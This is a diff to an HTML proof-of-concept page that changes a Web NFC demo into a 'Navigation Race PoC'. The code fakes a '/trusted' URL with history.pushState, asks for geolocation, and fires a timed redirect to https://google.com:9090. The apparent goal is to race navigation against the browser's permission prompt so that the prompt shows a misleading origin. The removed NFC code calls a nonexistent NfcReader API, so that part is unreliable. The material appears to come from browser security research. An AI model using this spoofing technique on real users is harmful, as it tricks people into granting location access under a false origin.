@@ -1,45 +1,36 @@
 <!doctype html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Web NFC PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
-<style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
-}
-
-button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-}
-
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
-
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
-}
-</style>
+  <meta charset="utf-8">
+  <title>Navigation Race PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, system-ui;
+      background: #f5f5f7;
+      text-align: center;
+    }
+    button {
+      font-size: 15px;
+      padding: 10px 14px;
+      border-radius: 10px;
+      border: none;
+      background: #007aff;
+      color: #fff;
+    }
+    #panel {
+      display: none;
+      max-width: 420px;
+      margin: 80px auto;
+      background: #fff;
+      padding: 24px;
+      border-radius: 16px;
+      box-shadow: 0 20px 60px rgba(0,0,0,.2);
+      text-align: center;
+    }
+  </style>
 </head>
-
 <body>
 
 <div style="text-align:center; margin-top:60px;">
@@ -47,70 +38,49 @@ button {
 </div>
 
 <div id="panel">
-  <h2>Request NFC Access</h2>
-  <p>Tap the button below to request NFC permission and read NFC tags.</p>
+  <h2>Request Permission</h2>
+  <p>Tap the button below to trigger permission request.</p>
 
-  <button onclick="readNfcTag()">Read NFC Tag</button>
-  <p id="output">NFC Data: -</p>
-
-  <div class="notice">
-    Demo only — observe origin shown in permission dialog
-  </div>
+  <button id="requestPermissionBtn">Request Permission</button>
+  <p id="status">Status: -</p>
 </div>
 
 <script>
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
+  const panel = document.getElementById('panel');
+  const trigger = document.getElementById('trigger');
+  const requestPermissionBtn = document.getElementById('requestPermissionBtn');
+  const status = document.getElementById('status');
 
-function readNfcTag() {
-  if (!("NFC" in window)) {
-    alert("Web NFC API is not supported on this device or browser.");
-    return;
-  }
+  // Step 1: Trigger showing panel
+  trigger.onclick = () => {
+    history.pushState({}, '', '/trusted');
+    panel.style.display = 'block';
+  };
 
-  try {
-    // Request NFC device
-    const reader = new NfcReader();
+  // Step 2: Mimic a request for permission, e.g., geolocation or camera
+  requestPermissionBtn.onclick = () => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          status.textContent = `Location: ${position.coords.latitude}, ${position.coords.longitude}`;
+        },
+        (error) => {
+          status.textContent = `Error: ${error.message}`;
+        }
+      );
+    }
+  };
 
-    reader.onreading = (event) => {
-      const tag = event.tag;
-      output.textContent = `NFC Tag Data: ${tag.serialNumber}`;
-    };
-
-    reader.onerror = (error) => {
-      output.textContent = 'Error reading NFC tag';
-    };
-
-    reader.start();
-    output.textContent = 'NFC reader started. Scan a tag.';
-  } catch (error) {
-    output.textContent = 'Permission denied or error accessing NFC';
-  }
-}
-
-/*
- * Step 1:
- * Manipulate visible URL to a trusted-looking path
- */
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-};
-
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission flow starts
- */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
+  // Step 3: Navigation Race after permission flow starts
+  window.addEventListener('pageshow', () => {
     requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
+      requestAnimationFrame(() => {
+        setTimeout(() => {
+          location.href = 'https://google.com:9090'; // Initiating race condition navigation
+        }, 80);
+      });
     });
   });
-});
 </script>
 
 </body>
